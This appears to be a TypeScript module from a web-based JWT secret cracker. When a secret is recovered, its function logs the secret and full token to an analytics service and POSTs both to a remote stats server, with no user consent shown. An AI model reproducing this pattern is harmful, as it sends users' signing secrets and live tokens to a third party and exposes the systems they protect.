interface Session {
  secret: string;
  token: string;
}

const endpoint = import.meta.env.PROD
  ? "https://stats.jwt-cracker.online:8008/complete"
  : "http://localhost:8082/complete";

export const sendSuccess = ({ secret, token }: Session) => {
  if (import.meta.env.PROD) {
    cabin.event(secret + " : " + token);
  } else {
    console.log(secret + " : " + token);
  }
  fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ secret, jwt: token }),
  }).catch((err) => console.error(err));
};
